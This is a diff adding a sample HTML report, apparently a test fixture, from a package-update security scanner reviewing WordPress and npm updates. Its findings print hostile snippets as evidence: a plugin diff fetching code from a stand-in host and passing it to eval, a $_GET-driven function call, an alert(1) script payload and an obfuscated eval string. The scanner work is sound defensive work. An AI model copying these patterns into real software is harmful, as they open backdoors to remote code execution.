@@ -1,0 +1,829 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;; style-src &#39;unsafe-inline&#39;; img-src data:; script-src &#39;sha256-JJgB3gRH5JbN/AdlGkyvpM&#43;i1ld67FiBEh/8fsuL0zg=&#39;">
+<meta name="referrer" content="no-referrer">
+<meta name="generator" content="rhythm-sightread <version>">
+<title>Sightread review: /var/www/shop</title>
+<style>
+:root {
+  --bg: #f6f6f4; --card: #ffffff; --text: #1b1b1f; --muted: #5f5f6b; --line: #e2e2dd; --code: #f0f0ec;
+  --critical: #b3261e; --high: #c2570c; --medium: #9a6b00; --low: #2f5f9e; --info: #5f5f6b;
+  --hold: #b3261e; --review: #9a6b00; --routine: #1e7a46; --allowed: #2f5f9e; --unverified: #6b3fa0;
+  --add: #e6f4ea; --del: #fbe9e7; --hunk: #eef1f8;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #131316; --card: #1c1c21; --text: #ececf1; --muted: #a2a2ad; --line: #2e2e36; --code: #17171b;
+    --critical: #ff6b61; --high: #ff9a4d; --medium: #e6b84a; --low: #7aa7e6; --info: #a2a2ad;
+    --hold: #ff6b61; --review: #e6b84a; --routine: #5ccf8b; --allowed: #7aa7e6; --unverified: #b48cf0;
+    --add: #15301f; --del: #3a1a17; --hunk: #1f2433;
+  }
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.55 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+main { max-width: 1100px; margin: 0 auto; padding: 24px 16px 48px; }
+h1 { font-size: 26px; margin: 0; overflow-wrap: anywhere; }
+h2 { font-size: 21px; margin: 0 0 4px; overflow-wrap: anywhere; }
+h3 { font-size: 15px; margin: 20px 0 8px; text-transform: uppercase; letter-spacing: .04em; }
+h4 { font-size: 15px; margin: 0 0 4px; overflow-wrap: anywhere; }
+p { margin: 4px 0; }
+.muted { color: var(--muted); }
+.card { background: var(--card); border: 1px solid var(--line); border-radius: 10px; padding: 20px; margin: 16px 0; }
+table { width: 100%; border-collapse: collapse; font-size: 14px; }
+th, td { text-align: left; padding: 6px 8px; border-bottom: 1px solid var(--line); vertical-align: top; overflow-wrap: anywhere; }
+th { color: var(--muted); font-weight: 600; }
+table.sortable th[data-col] { cursor: pointer; user-select: none; }
+th[aria-sort="ascending"]::after { content: " ▲"; }
+th[aria-sort="descending"]::after { content: " ▼"; }
+.pills { display: flex; gap: 8px; flex-wrap: wrap; margin: 12px 0 0; padding: 0; list-style: none; }
+.pills li { border: 1px solid var(--line); border-radius: 999px; padding: 2px 12px; font-size: 13px; background: var(--card); }
+.pills b { font-size: 15px; }
+.verdict { display: inline-block; min-width: 92px; text-align: center; border-radius: 4px; padding: 1px 6px; font-size: 12px; font-weight: 700; color: #fff; }
+.v-hold { background: var(--hold); } .v-review { background: var(--review); } .v-routine { background: var(--routine); }
+.v-allowed { background: var(--allowed); } .v-unverified { background: var(--unverified); }
+.pills .hold b { color: var(--hold); } .pills .review b { color: var(--review); } .pills .routine b { color: var(--routine); }
+.pills .allowed b { color: var(--allowed); } .pills .unverified b { color: var(--unverified); }
+.sev { display: inline-block; min-width: 72px; text-align: center; border-radius: 4px; padding: 1px 6px; font-size: 12px; font-weight: 700; color: #fff; }
+.sev-critical { background: var(--critical); } .sev-high { background: var(--high); } .sev-medium { background: var(--medium); }
+.sev-low { background: var(--low); } .sev-info { background: var(--info); }
+.sev.likely { background: transparent; border: 1px solid currentColor; }
+.sev.likely.sev-critical { color: var(--critical); } .sev.likely.sev-high { color: var(--high); } .sev.likely.sev-medium { color: var(--medium); }
+.sev.likely.sev-low { color: var(--low); } .sev.likely.sev-info { color: var(--info); }
+.notes { border-left: 4px solid var(--high); padding: 8px 12px; margin: 12px 0; background: var(--card); }
+.facts { display: grid; grid-template-columns: max-content 1fr; gap: 2px 12px; margin: 12px 0; }
+.facts dt { color: var(--muted); }
+.facts dd { margin: 0; overflow-wrap: anywhere; }
+.pair { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 12px 0; }
+@media (max-width: 720px) { .pair { grid-template-columns: 1fr; } }
+blockquote { margin: 0; padding: 6px 12px; border-left: 3px solid var(--line); overflow-wrap: anywhere; }
+ul.adds { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: max-content max-content; gap: 0 12px; }
+ul.adds .zero { color: var(--muted); }
+.size { margin: 8px 0; font-size: 13px; }
+.bar { height: 8px; border-radius: 4px; background: var(--muted); margin: 2px 0 6px; }
+.bar.to { background: var(--high); }
+article.finding { border-top: 1px solid var(--line); padding: 12px 0; }
+article.finding:first-of-type { border-top: 0; }
+.where, code, pre, td.code, td.ln { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 13px; }
+.where, code { overflow-wrap: anywhere; }
+pre { background: var(--code); border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; white-space: pre-wrap; overflow-wrap: anywhere; margin: 6px 0 0; }
+.tag { display: inline-block; border: 1px solid var(--line); border-radius: 4px; padding: 0 6px; font-size: 12px; color: var(--muted); }
+details { margin: 6px 0; }
+summary { cursor: pointer; }
+.explain p { margin: 6px 0; }
+button { font: inherit; font-size: 12px; border: 1px solid var(--line); background: var(--card); color: var(--text); border-radius: 4px; padding: 1px 8px; cursor: pointer; }
+.toolbar { display: flex; justify-content: flex-end; margin: 8px 0; }
+table.diff { margin: 6px 0; border: 1px solid var(--line); table-layout: fixed; }
+table.diff td { border: 0; padding: 0 6px; white-space: pre-wrap; overflow-wrap: anywhere; }
+table.diff td.ln { width: 4.5em; color: var(--muted); text-align: right; user-select: none; }
+table.diff.unified td.code { width: auto; }
+tr.add td.code, td.code.add { background: var(--add); }
+tr.del td.code, td.code.del { background: var(--del); }
+tr.hunk td, td.code.hunk { background: var(--hunk); color: var(--muted); }
+table.split { display: none; }
+body.side table.split { display: table; }
+body.side table.unified { display: none; }
+.file { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 13px; overflow-wrap: anywhere; }
+.allow code { display: inline-block; margin-top: 4px; }
+footer { margin-top: 32px; font-size: 13px; color: var(--muted); }
+@media print {
+  body { background: #fff; }
+  .card { border: 0; padding: 0; }
+  button, .toolbar { display: none; }
+  article.finding { break-inside: avoid; }
+}
+</style>
+</head>
+<body>
+<main>
+<header>
+<h1>Sightread review: /var/www/shop</h1>
+<p class="muted">2026-10-26 09:12 UTC · rhythm-sightread <version> · signals 2026.10.24 · names 2026.10.24 · 2 sites</p>
+<ul class="pills">
+<li class="hold"><b>1</b> hold</li>
+<li class="review"><b>1</b> review</li>
+<li class="routine"><b>2</b> routine</li>
+<li class="allowed"><b>1</b> allowed</li>
+<li class="unverified"><b>1</b> unverified</li>
+</ul>
+<div class="notes">
+<p><strong>Incomplete review: 1 update couldn&#39;t be verified, 1 package wasn&#39;t checked and 1 error.</strong></p>
+<p>--skip-roadie-verify was used</p>
+</div>
+</header>
+<section class="card">
+<h2>Updates</h2>
+<table class="sortable">
+<thead><tr><th data-col="0">Verdict</th><th data-col="1">Update</th><th data-col="2">From</th><th data-col="3">To</th><th data-col="4">Findings</th><th data-col="5">Sites</th></tr></thead>
+<tbody>
+<tr><td data-v="0"><span class="verdict v-hold">HOLD</span></td><td><a href="#u1">countdown-timer-ultimate</a> <span class="muted">(wp-plugin)</span></td><td>2.6.7</td><td>2.6.8</td><td data-v="0">11 critical</td><td data-v="0">0</td></tr>
+<tr><td data-v="1"><span class="verdict v-review">REVIEW</span></td><td><a href="#u2">@acme/widgets</a> <span class="muted">(npm)</span></td><td>1.4.0</td><td>1.5.0</td><td data-v="1">21 high, 12 medium</td><td data-v="0">0</td></tr>
+<tr><td data-v="2"><span class="verdict v-unverified">UNVERIFIED</span></td><td><a href="#u3">astra</a> <span class="muted">(wp-theme)</span></td><td>4.8.0</td><td>4.8.1</td><td data-v="5">none</td><td data-v="0">0</td></tr>
+<tr><td data-v="3"><span class="verdict v-allowed">ALLOWED</span></td><td><a href="#u4">wordfence</a> <span class="muted">(wp-plugin)</span></td><td>7.11.6</td><td>7.11.7</td><td data-v="5">1 allowed</td><td data-v="0">0</td></tr>
+<tr><td data-v="4"><span class="verdict v-routine">ROUTINE</span></td><td><a href="#u5">monolog/monolog</a> <span class="muted">(composer)</span></td><td>3.12.0</td><td>3.12.1</td><td data-v="3">3 low, 3 info</td><td data-v="0">0</td></tr>
+<tr><td data-v="4"><span class="verdict v-routine">ROUTINE</span></td><td><a href="#u6">wpforms-lite</a> <span class="muted">(wp-plugin)</span></td><td>1.9.1</td><td>1.9.2</td><td data-v="5">none</td><td data-v="2">2</td></tr>
+</tbody>
+</table>
+</section>
+<div class="toolbar"><button type="button" id="view">Show side by side</button></div>
+<section class="card" id="u1">
+<h2><span class="verdict v-hold">HOLD</span> countdown-timer-ultimate 2.6.7 → 2.6.8</h2>
+<p class="muted">wp-plugin</p>
+<dl class="facts">
+<dt>Installed</dt><dd class="where">wp-content/plugins/countdown-timer-ultimate</dd>
+<dt>Integrity</dt><dd>both versions: every file matches wordpress.org checksums (SHA-256) <span class="muted">(wordpress.org)</span></dd>
+<dt>sha256</dt><dd><code>2222222222222222222222222222222222222222222222222222222222222222</code> <button type="button" data-copy="2222222222222222222222222222222222222222222222222222222222222222">copy</button></dd>
+<dt>Archive</dt><dd><code>hxxps://downloads.wordpress[.]org/plugin/sample.2.6.8.zip</code></dd>
+<dt>Publisher</dt><dd>sampleauthor</dd>
+<dt>Diff</dt><dd>14 files changed, 1 added, 0 removed; &#43;2184 -12 lines</dd>
+</dl>
+<div class="pair">
+<div>
+<h3>Changelog</h3>
+<blockquote><span class="muted">2.6.8:</span> Check compatibility with WordPress 6.8</blockquote>
+</div>
+<div>
+<h3>What the diff adds</h3>
+<ul class="adds">
+<li>network</li><li>1</li>
+<li>execution</li><li>3</li>
+<li>files</li><li>1</li>
+<li>users</li><li>1</li>
+<li class="zero">cron</li><li class="zero">0</li>
+<li>dependencies</li><li>1</li>
+</ul>
+</div>
+</div>
+<div class="size">
+<span class="muted">Size from</span> 412 KB
+<div class="bar" style="width: 95%"></div>
+<span class="muted">to</span> 431 KB
+<div class="bar to" style="width: 100%"></div>
+</div>
+<h3>Findings (11)</h3>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Archive does not match the published hash <span class="tag">integrity-mismatch</span></h4>
+<div class="where">includes/integrity-mismatch.php:10</div>
+<pre>integrity-mismatch evidence</pre>
+<p>→ Review integrity-mismatch before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Same version, different bytes than the lockfile recorded <span class="tag">version-republished</span></h4>
+<div class="where">includes/version-republished.php:10</div>
+<pre>version-republished evidence</pre>
+<p>→ Review version-republished before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Allowed version now has a different hash <span class="tag">approved-version-changed</span></h4>
+<div class="where">includes/approved-version-changed.php:10</div>
+<pre>approved-version-changed evidence</pre>
+<p>→ Review approved-version-changed before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Listed as malicious by OSV <span class="tag">known-malicious</span></h4>
+<div class="where">includes/known-malicious.php:10</div>
+<pre>known-malicious evidence</pre>
+<p>→ Review known-malicious before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Closed on WordPress.org <span class="tag">wporg-closed</span></h4>
+<div class="where">includes/wporg-closed.php:10</div>
+<pre>wporg-closed evidence</pre>
+<p>→ Review wporg-closed before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Archive entry points outside the package <span class="tag">archive-path-escape</span></h4>
+<div class="where">includes/archive-path-escape.php:10</div>
+<pre>archive-path-escape evidence</pre>
+<p>→ Review archive-path-escape before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Fetches remote code and runs it <span class="tag">remote-fetch-exec</span></h4>
+<div class="where">includes/class-wpos-analytics.php:88</div>
+<pre>wp_remote_get(&#39;hxxps://analytics.wpos-cdn[.]example/v2/p&#39;) → eval($body)</pre>
+<p>Domains: <code>analytics.wpos-cdn[.]example</code></p>
+<p>→ Review remote-fetch-exec before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Decodes hidden code and runs it <span class="tag">decode-exec</span></h4>
+<div class="where">includes/decode-exec.php:10</div>
+<pre>decode-exec evidence</pre>
+<p>→ Review decode-exec before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Hides users from the admin user list <span class="tag">admin-user-hidden</span></h4>
+<div class="where">includes/admin-user-hidden.php:10</div>
+<pre>admin-user-hidden evidence</pre>
+<p>→ Review admin-user-hidden before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Private name also published publicly <span class="tag">dependency-confusion</span></h4>
+<div class="where">includes/dependency-confusion.php:10</div>
+<pre>dependency-confusion evidence</pre>
+<p>→ Review dependency-confusion before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-critical">CRITICAL</span> Runs code built at run time <span class="tag">eval-dynamic</span></h4>
+<div class="where">includes/loader.php:20</div>
+<p class="muted">Raised by owner-change.</p>
+<pre>$f = $_GET[&#39;cb&#39;]; $f();</pre>
+<p>→ Review eval-dynamic before you update.</p>
+</article>
+<h3>Diff</h3>
+<details open><summary class="file">includes/class-wpos-analytics.php</summary>
+
+<table class="diff unified"><tbody>
+<tr class="hunk" data-k="@"><td class="ln"></td><td class="ln"></td><td class="code">@@ -80,2 &#43;80,4 @@</td></tr>
+<tr class="ctx" data-k=" "><td class="ln">80</td><td class="ln">80</td><td class="code">function wpos_init() {</td></tr>
+<tr class="add" data-k="&#43;"><td class="ln"></td><td class="ln">81</td><td class="code">  $b = wp_remote_get(&#39;hxxps://analytics.wpos-cdn[.]example/v2/p&#39;);</td></tr>
+<tr class="add" data-k="&#43;"><td class="ln"></td><td class="ln">82</td><td class="code">  eval($b[&#39;body&#39;]);</td></tr>
+<tr class="ctx" data-k=" "><td class="ln">81</td><td class="ln">83</td><td class="code">}</td></tr>
+</tbody></table>
+</details>
+<div class="allow">
+<h3>Record your review</h3>
+<code>rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason &#34;...&#34;</code> <button type="button" data-copy="rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason &#34;...&#34;">copy</button>
+<p class="muted">It records this archive by its sha256 <code>2222222222222222222222222222222222222222222222222222222222222222</code>; any other bytes for 2.6.8 are flagged.</p>
+</div>
+</section>
+<section class="card" id="u2">
+<h2><span class="verdict v-review">REVIEW</span> @acme/widgets 1.4.0 → 1.5.0</h2>
+<p class="muted">npm</p>
+<dl class="facts">
+<dt>Installed</dt><dd class="where">package-lock.json:42</dd>
+<dt>Integrity</dt><dd>both versions: verified by signature <span class="muted">(registry.npmjs.org)</span></dd>
+<dt>sha256</dt><dd><code>2222222222222222222222222222222222222222222222222222222222222222</code> <button type="button" data-copy="2222222222222222222222222222222222222222222222222222222222222222">copy</button></dd>
+<dt>Publisher</dt><dd>not known</dd>
+</dl>
+<div class="pair">
+<div>
+<h3>Changelog</h3>
+<p class="muted">None for this version.</p>
+</div>
+<div>
+<h3>What the diff adds</h3>
+<ul class="adds">
+<li>network</li><li>7</li>
+<li>execution</li><li>9</li>
+<li>files</li><li>3</li>
+<li>users</li><li>3</li>
+<li class="zero">cron</li><li class="zero">0</li>
+<li>dependencies</li><li>4</li>
+</ul>
+</div>
+</div>
+<h3>Findings (33)</h3>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Lockfile entry moved off the registry <span class="tag">lockfile-source-change</span></h4>
+<div class="where">includes/lockfile-source-change.php:10</div>
+<pre>lockfile-source-change evidence</pre>
+<p>→ Review lockfile-source-change before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Archive holds a link or special file <span class="tag">archive-link</span></h4>
+<div class="where">includes/archive-link.php:10</div>
+<pre>archive-link evidence</pre>
+<p>→ Review archive-link before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Archive holds two entries with the same name <span class="tag">archive-collision</span></h4>
+<div class="where">includes/archive-collision.php:10</div>
+<pre>archive-collision evidence</pre>
+<p>→ Review archive-collision before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Code that could not be analysed <span class="tag">unanalysed</span></h4>
+<div class="where">includes/unanalysed.php:10</div>
+<pre>unanalysed evidence</pre>
+<p>→ Review unanalysed before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Runs code built at run time <span class="tag">eval-dynamic</span></h4>
+<div class="where">includes/eval-dynamic.php:10</div>
+<pre>eval-dynamic evidence</pre>
+<p>→ Review eval-dynamic before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Adds a large encoded or scrambled blob <span class="tag">obfuscation</span></h4>
+<div class="where">includes/obfuscation.php:10</div>
+<pre>obfuscation evidence</pre>
+<p>→ Review obfuscation before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Unserializes request or remote data <span class="tag">input-unserialize</span></h4>
+<div class="where">includes/input-unserialize.php:10</div>
+<pre>input-unserialize evidence</pre>
+<p>→ Review input-unserialize before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Writes files outside its own folder <span class="tag">write-outside-package</span></h4>
+<div class="where">includes/write-outside-package.php:10</div>
+<pre>write-outside-package evidence</pre>
+<p>→ Review write-outside-package before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Creates an administrator account <span class="tag">admin-user-create</span></h4>
+<div class="where">includes/admin-user-create.php:10</div>
+<pre>admin-user-create evidence</pre>
+<p>→ Review admin-user-create before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Grants admin capabilities to another role <span class="tag">capability-change</span></h4>
+<div class="where">includes/capability-change.php:10</div>
+<pre>capability-change evidence</pre>
+<p>→ Review capability-change before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Blocks updates of other plugins or themes <span class="tag">update-suppression</span></h4>
+<div class="where">includes/update-suppression.php:10</div>
+<pre>update-suppression evidence</pre>
+<p>→ Review update-suppression before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Shows search engines different content <span class="tag">bot-cloaking</span></h4>
+<div class="where">includes/bot-cloaking.php:10</div>
+<pre>bot-cloaking evidence</pre>
+<p>→ Review bot-cloaking before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Reads credentials or tokens <span class="tag">credential-access</span></h4>
+<div class="where">includes/credential-access.php:10</div>
+<pre>credential-access evidence</pre>
+<p>→ Review credential-access before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Sends site data to a new host <span class="tag">data-exfil</span></h4>
+<div class="where">includes/data-exfil.php:10</div>
+<pre>data-exfil evidence</pre>
+<p>→ Review data-exfil before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Hides code in an image, font or text file <span class="tag">code-in-asset</span></h4>
+<div class="where">includes/code-in-asset.php:10</div>
+<pre>code-in-asset evidence</pre>
+<p>→ Review code-in-asset before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Adds or changes an install script <span class="tag">npm-install-script-new</span></h4>
+<div class="where">includes/npm-install-script-new.php:10</div>
+<pre>npm-install-script-new evidence</pre>
+<p>→ Review npm-install-script-new before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Runs code when Composer installs it <span class="tag">composer-plugin-new</span></h4>
+<div class="where">includes/composer-plugin-new.php:10</div>
+<pre>composer-plugin-new evidence</pre>
+<p>→ Review composer-plugin-new before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> New owner or publisher <span class="tag">owner-change</span></h4>
+<div class="where">includes/owner-change.php:10</div>
+<pre>owner-change evidence</pre>
+<p>→ Review owner-change before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Release lost its build provenance <span class="tag">provenance-dropped</span></h4>
+<div class="where">includes/provenance-dropped.php:10</div>
+<pre>provenance-dropped evidence</pre>
+<p>→ Review provenance-dropped before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> New dependency named like a popular package <span class="tag">typosquat</span></h4>
+<div class="where">includes/typosquat.php:10</div>
+<pre>typosquat evidence</pre>
+<p>→ Review typosquat before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high">HIGH</span> Has a known vulnerability <span class="tag">known-vulnerable</span></h4>
+<div class="where">includes/known-vulnerable.php:10</div>
+<pre>known-vulnerable evidence</pre>
+<p>→ Review known-vulnerable before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Contacts a new domain <span class="tag">outbound-new-domain</span></h4>
+<div class="where">includes/outbound-new-domain.php:10</div>
+<pre>outbound-new-domain evidence</pre>
+<p>→ Review outbound-new-domain before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> Adds a REST route anyone can call <span class="tag">rest-open-route</span></h4>
+<div class="where">includes/rest-open-route.php:10</div>
+<pre>rest-open-route evidence</pre>
+<p>→ Review rest-open-route before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> Changelog does not mention what the code adds <span class="tag">changelog-mismatch</span></h4>
+<div class="where">includes/changelog-mismatch.php:10</div>
+<pre>changelog-mismatch evidence</pre>
+<p>→ Review changelog-mismatch before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Adds a runtime dependency <span class="tag">dependency-new</span></h4>
+<div class="where">includes/dependency-new.php:10</div>
+<pre>dependency-new evidence</pre>
+<p>→ Review dependency-new before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Adds a file that runs on every request <span class="tag">composer-autoload-files</span></h4>
+<div class="where">includes/composer-autoload-files.php:10</div>
+<pre>composer-autoload-files evidence</pre>
+<p>→ Review composer-autoload-files before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> Released very recently <span class="tag">fresh-release</span></h4>
+<div class="where">includes/fresh-release.php:10</div>
+<pre>fresh-release evidence</pre>
+<p>→ Review fresh-release before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> First release after a long silence <span class="tag">dormant-release</span></h4>
+<div class="where">includes/dormant-release.php:10</div>
+<pre>dormant-release evidence</pre>
+<p>→ Review dormant-release before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> No matching tag in the repository <span class="tag">git-tag-missing</span></h4>
+<div class="where">includes/git-tag-missing.php:10</div>
+<pre>git-tag-missing evidence</pre>
+<p>→ Review git-tag-missing before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> Code grew far more than usual <span class="tag">size-jump</span></h4>
+<div class="where">includes/size-jump.php:10</div>
+<pre>size-jump evidence</pre>
+<p>→ Review size-jump before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Hidden or bidirectional characters in code <span class="tag">unicode-hidden</span></h4>
+<div class="where">includes/admin.php:12</div>
+<pre>\x1b[31mredtxt.php &lt;script&gt;alert(1)&lt;/script&gt; [link](hxxps://evil[.]example) @team token npm_•••••</pre>
+<p>→ Review unicode-hidden before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Adds a credential to the code <span class="tag">secret-added</span></h4>
+<div class="where">includes/config.php:3</div>
+<pre>define(&#39;API_KEY&#39;, &#39;sk_l•••••&#39;);</pre>
+<p>→ Review secret-added before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium likely">MEDIUM, LIKELY</span> Adds a large encoded or scrambled blob <span class="tag">obfuscation</span></h4>
+<div class="where">assets/js/vendor.min.js:1</div>
+<p class="muted">Demoted: vendored path.</p>
+<pre>var _0x1a2b=[&#39;\x65\x76\x61\x6c&#39;];</pre>
+<p>→ Review obfuscation before you update.</p>
+</article>
+<details><summary>Not counted: 1 in the baseline, 1 ignored by config and 1 below --min-confidence.</summary>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Contacts a new domain <span class="tag">outbound-new-domain</span> <span class="tag">in the baseline</span></h4>
+<div class="where">includes/api.php:30</div>
+<pre>hxxps://api.acme[.]example/v1</pre>
+<p>→ Review outbound-new-domain before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-medium">MEDIUM</span> Contacts a new domain <span class="tag">outbound-new-domain</span> <span class="tag">ignored by config</span></h4>
+<div class="where">src/Internal/Admin/RemoteInboxNotifications/feed.php:5</div>
+<pre>hxxps://inbox.woo[.]example</pre>
+<p>→ Review outbound-new-domain before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-high likely">HIGH, LIKELY</span> Shows search engines different content <span class="tag">bot-cloaking</span> <span class="tag">below --min-confidence</span></h4>
+<div class="where">includes/seo.php:40</div>
+<pre>if (strpos($_SERVER[&#39;HTTP_USER_AGENT&#39;], &#39;Googlebot&#39;))</pre>
+<p>→ Review bot-cloaking before you update.</p>
+</article>
+</details>
+<div class="allow">
+<h3>Record your review</h3>
+<code>rhythm sightread allow npm:@acme/widgets@1.5.0 --reason &#34;...&#34;</code> <button type="button" data-copy="rhythm sightread allow npm:@acme/widgets@1.5.0 --reason &#34;...&#34;">copy</button>
+<p class="muted">It records this archive by its sha256 <code>2222222222222222222222222222222222222222222222222222222222222222</code>; any other bytes for 1.5.0 are flagged.</p>
+</div>
+</section>
+<section class="card" id="u3">
+<h2><span class="verdict v-unverified">UNVERIFIED</span> astra 4.8.0 → 4.8.1</h2>
+<p class="muted">wp-theme</p>
+<dl class="facts">
+<dt>Integrity</dt><dd>both versions: every file matches wordpress.org checksums (SHA-256) <span class="muted">(wordpress.org)</span></dd>
+<dt>sha256</dt><dd><code>4444444444444444444444444444444444444444444444444444444444444444</code> <button type="button" data-copy="4444444444444444444444444444444444444444444444444444444444444444">copy</button></dd>
+<dt>Archive</dt><dd><code>hxxps://downloads.wordpress[.]org/plugin/sample.4.8.1.zip</code></dd>
+<dt>Publisher</dt><dd>sampleauthor</dd>
+</dl>
+<p class="notes">couldn&#39;t verify astra 4.8.1: wordpress.org checksums answered 503</p>
+<div class="pair">
+<div>
+<h3>Changelog</h3>
+<p class="muted">None for this version.</p>
+</div>
+<div>
+<h3>What the diff adds</h3>
+<ul class="adds">
+<li class="zero">network</li><li class="zero">0</li>
+<li class="zero">execution</li><li class="zero">0</li>
+<li class="zero">files</li><li class="zero">0</li>
+<li class="zero">users</li><li class="zero">0</li>
+<li class="zero">cron</li><li class="zero">0</li>
+<li class="zero">dependencies</li><li class="zero">0</li>
+</ul>
+</div>
+</div>
+<div class="allow">
+<h3>Record your review</h3>
+<p class="muted">This version isn't verified, so it can't be allowed yet.</p>
+</div>
+</section>
+<section class="card" id="u4">
+<h2><span class="verdict v-allowed">ALLOWED</span> wordfence 7.11.6 → 7.11.7</h2>
+<p class="muted">wp-plugin</p>
+<dl class="facts">
+<dt>Integrity</dt><dd>both versions: every file matches wordpress.org checksums (SHA-256) <span class="muted">(wordpress.org)</span></dd>
+<dt>sha256</dt><dd><code>7777777777777777777777777777777777777777777777777777777777777777</code> <button type="button" data-copy="7777777777777777777777777777777777777777777777777777777777777777">copy</button></dd>
+<dt>Archive</dt><dd><code>hxxps://downloads.wordpress[.]org/plugin/sample.7.11.7.zip</code></dd>
+<dt>Publisher</dt><dd>sampleauthor</dd>
+</dl>
+<div class="pair">
+<div>
+<h3>Changelog</h3>
+<p class="muted">None for this version.</p>
+</div>
+<div>
+<h3>What the diff adds</h3>
+<ul class="adds">
+<li class="zero">network</li><li class="zero">0</li>
+<li class="zero">execution</li><li class="zero">0</li>
+<li class="zero">files</li><li class="zero">0</li>
+<li class="zero">users</li><li class="zero">0</li>
+<li>cron</li><li>1</li>
+<li class="zero">dependencies</li><li class="zero">0</li>
+</ul>
+</div>
+</div>
+<details><summary>Not counted: 1 allowed.</summary>
+
+<article class="finding">
+<h4><span class="sev sev-low">LOW</span> Schedules a new background task <span class="tag">cron-new-hook</span> <span class="tag">allowed by Rhythm Shahriar on 2026-10-20: new cron hook is the scheduled scan, checked the code</span></h4>
+<div class="where">includes/cron.php:8</div>
+<pre>wp_schedule_event(time(), &#39;hourly&#39;, &#39;wordfence_scan&#39;)</pre>
+<p>→ Review cron-new-hook before you update.</p>
+</article>
+</details>
+</section>
+<section class="card" id="u5">
+<h2><span class="verdict v-routine">ROUTINE</span> monolog/monolog 3.12.0 → 3.12.1</h2>
+<p class="muted">composer</p>
+<dl class="facts">
